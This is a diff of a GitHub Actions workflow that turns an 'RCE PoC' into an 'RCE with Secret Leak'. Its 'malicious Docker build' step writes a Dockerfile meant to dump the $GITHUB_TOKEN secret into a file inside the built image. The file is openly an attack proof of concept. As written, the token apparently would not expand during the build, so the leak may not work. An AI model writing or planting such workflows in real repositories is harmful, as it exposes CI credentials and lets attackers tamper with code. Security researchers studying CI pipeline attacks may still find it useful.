@@ -1,4 +1,5 @@
-name: RCE PoC
+name: RCE with Secret Leak
+
 on:
   push:
 
@@ -6,10 +7,10 @@ jobs:
   rce:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v2
+      - name: Checkout repository
+        uses: actions/checkout@v2
 
-    - name: Run malicious Docker build
-      run: |
-        echo -e "FROM alpine\nRUN echo HACKED > /HACKED" > Dockerfile
-        docker build -t test-image .
+      - name: Run malicious Docker build
+        run: |
+          echo -e 'FROM alpine\nRUN echo $GITHUB_TOKEN > /leaked' > Dockerfile
+          docker build -t test-image .
